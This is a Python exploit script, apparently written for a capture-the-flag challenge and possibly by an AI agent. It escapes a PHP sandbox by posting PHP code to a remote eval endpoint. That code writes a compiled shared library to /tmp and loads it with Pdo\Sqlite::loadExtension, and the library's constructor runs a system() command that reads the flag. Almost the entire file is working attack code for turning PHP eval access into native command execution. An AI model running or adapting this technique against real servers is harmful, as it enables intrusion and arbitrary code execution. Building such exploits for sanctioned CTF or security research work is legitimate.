#!/usr/bin/env python3
"""PHP Sandbox Escape: SplFileObject write + Pdo\\Sqlite::loadExtension -> /readflag."""
from __future__ import annotations

import argparse
import ssl
import subprocess
import urllib.parse
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
ART = HERE / "artifacts"
SRC = ART / "ext.c"
SO = ART / "pwn.so"

EXT_C = r"""
#include <stdlib.h>

static void go(void) {
    system("/readflag > /tmp/flagout");
}

__attribute__((constructor))
static void ctor(void) {
    go();
}

int sqlite3_extension_init(void *db, char **err, const void *api) {
    (void)db; (void)err; (void)api;
    go();
    return 0;
}

int sqlite3_pwn_init(void *db, char **err, const void *api) {
    (void)db; (void)err; (void)api;
    go();
    return 0;
}
"""

PHP = r"""
$h="%s";
$f=new SplFileObject("/tmp/pwn.so","w");
$n=$f->fwrite(hex2bin($h));
$f->fflush();
echo "wrote=$n\n";
$pdo=new Pdo\Sqlite("sqlite::memory:");
try { $pdo->loadExtension("/tmp/pwn.so"); echo "loaded\n"; } catch (Throwable $e) { echo "load_err=", $e->getMessage(), "\n"; }
try {
  $g=new SplFileObject("/tmp/flagout","r");
  echo "FLAG=";
  while(!$g->eof()) echo $g->fgets();
} catch (Throwable $e) { echo "read_err=", $e->getMessage(), "\n"; }
"""


def compile_so() -> None:
    ART.mkdir(parents=True, exist_ok=True)
    SRC.write_text(EXT_C)
    if SO.exists() and SO.stat().st_size > 0:
        return
    subprocess.run(
        [
            "docker",
            "run",
            "--rm",
            "-v",
            f"{ART}:/work",
            "-w",
            "/work",
            "ubuntu:24.04",
            "bash",
            "-lc",
            "apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq gcc >/dev/null "
            "&& gcc -shared -fPIC -o pwn.so ext.c",
        ],
        check=True,
    )


def eval_php(host: str, cmd: str) -> str:
    url = f"https://{host}/index.php"
    data = urllib.parse.urlencode({"cmd": cmd}).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
        return r.read().decode(errors="replace")


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="", help="challenge HTTP host, no scheme")
    args = p.parse_args()
    host = args.host.strip()
    if not host:
        remote = HERE / "REMOTE.txt"
        host = remote.read_text().strip() if remote.exists() else ""
    if not host:
        raise SystemExit("pass --host or write agent_workspace/REMOTE.txt")

    compile_so()
    hx = SO.read_bytes().hex()
    out = eval_php(host, PHP % hx)
    print(out, end="" if out.endswith("\n") else "\n")


if __name__ == "__main__":
    main()
